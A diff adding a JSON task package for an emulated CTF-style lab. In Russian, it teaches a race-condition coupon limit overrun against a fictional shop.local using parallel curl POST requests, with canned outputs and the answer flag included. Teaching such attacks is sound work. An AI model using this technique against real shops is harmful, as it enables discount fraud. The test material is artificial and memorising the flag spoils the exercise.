@@ -1,0 +1,37 @@
+{
+  "id": "web-logic-races",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{r4c3_0v3rrun_0n3_p4ck3t}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: race condition (limit overrun)\n\n`shop.local` даёт одноразовый купон `SAVE10` («один раз на пользователя»).\nСервер делает `if (!used) { mark_used(); apply_discount(); }` — между\nпроверкой и записью есть зазор. Если послать запросы ОДНОВРЕМЕННО, они\nпройдут проверку до того, как состояние изменится.\n\n1. Один запрос (купон применён, повтор — отказ):\n   curl -s -X POST 'http://shop.local/cart/coupon' -d 'code=SAVE10'\n2. Гонка. Одновременные запросы в curl — через `--parallel` и URL-глоб\n   (пачка из 20 штук):\n   curl -s --parallel -X POST 'http://shop.local/cart/coupon?code=SAVE10&burst=20'\n3. Часть запросов пройдёт мимо лимита, итог корзины уйдёт в минус, и\n   сервер вернёт флаг.\n4. Флаг — последняя строка. Запиши в `found.txt` и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local/cart/coupon)",
+      "cases": [
+        {
+          "match": "parallel|burst",
+          "example": "-s --parallel -X POST 'http://shop.local/cart/coupon?code=SAVE10&burst=20'",
+          "output": "[1] {\"status\":\"ok\",\"applied\":true,\"discount\":10}\n[2] {\"status\":\"ok\",\"applied\":true,\"discount\":10}\n[3] {\"status\":\"ok\",\"applied\":true,\"discount\":10}\n[4] {\"status\":\"ok\",\"applied\":true,\"discount\":10}\n[5] {\"status\":\"ok\",\"applied\":true,\"discount\":10}\n[6] {\"status\":\"error\",\"message\":\"coupon_already_used\"}\n[7] {\"status\":\"error\",\"message\":\"coupon_already_used\"}\n[8] {\"status\":\"error\",\"message\":\"coupon_already_used\"}\n=== cart state ===\n{\"order\":555,\"total\":-40,\"discount_applied\":5,\"note\":\"race won: limit overrun\",\"flag\":\"nto{r4c3_0v3rrun_0n3_p4ck3t}\"}\n"
+        },
+        {
+          "match": "cart/coupon",
+          "example": "-s -X POST 'http://shop.local/cart/coupon' -d 'code=SAVE10'",
+          "output": "{\"status\":\"ok\",\"discount\":10,\"order_total\":90,\"message\":\"coupon applied (limit 1 per user)\"}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только http://shop.local/cart/coupon.\n"
+    }
+  }
+}
